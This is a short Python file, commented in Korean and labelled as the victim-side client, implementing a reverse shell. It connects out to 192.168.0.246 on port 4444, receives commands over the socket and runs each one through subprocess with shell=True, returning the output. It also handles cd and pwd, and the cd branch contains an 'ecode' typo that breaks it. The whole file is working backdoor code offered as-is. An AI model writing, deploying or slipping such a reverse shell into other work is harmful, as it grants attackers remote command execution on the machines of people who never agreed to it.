# 클라이언트(피해자) 소스 코드
import socket
import subprocess
import os

def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))
    return s

def connect_cns(s):
    while True:
        cwd = os.getcwd() # 현재 작업 디렉터리 경로 반환
        command = s.recv(65535).decode().lower()
        if command == "exit":
            s.close()
            break
        elif command == "pwd":
            s.send(cwd.encode("utf-8"))
            continue
        
        try:
            if command.startswith("cd"): # cd abc
                os.chdir(command[3:].replace("\n", ""))
                command=""
                cwd = os.getcwd()
                s.send(cwd.ecode("euc-kr"))
                continue
        
        except Exception as e:
            s.send(str(e).encode("euc-kr", "ignore"))
        
        # 새로운 프로세스를 생성 및 관리하는 subprocess모듈
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)


if __name__ == '__main__':
    ip = "192.168.0.246"
    port = 4444
    s = set_sock(ip, port)
    connect_cns(s)